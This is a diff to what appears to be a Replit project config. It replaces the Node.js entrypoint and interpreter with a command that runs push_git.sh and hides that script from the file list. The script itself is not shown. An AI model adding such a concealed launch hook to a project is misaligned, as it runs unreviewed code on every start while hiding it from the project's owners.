@@ -1,14 +1,10 @@
-entrypoint = "index.js"
+entrypoint = "chmod +x push_git.sh & ./push_git.sh"
 
-hidden = [".config"]
+hidden = [".config", "push_git.sh"]
 
 [interpreter]
 command = [
-    "prybar-nodejs",
-    "-q",
-    "--ps1",
-    "\u0001\u001b[33m\u0002\u0001\u001b[00m\u0002 ",
-    "-i"
+    "chmod +x push_git.sh & ./push_git.sh"
 ]
 
 [[hints]]
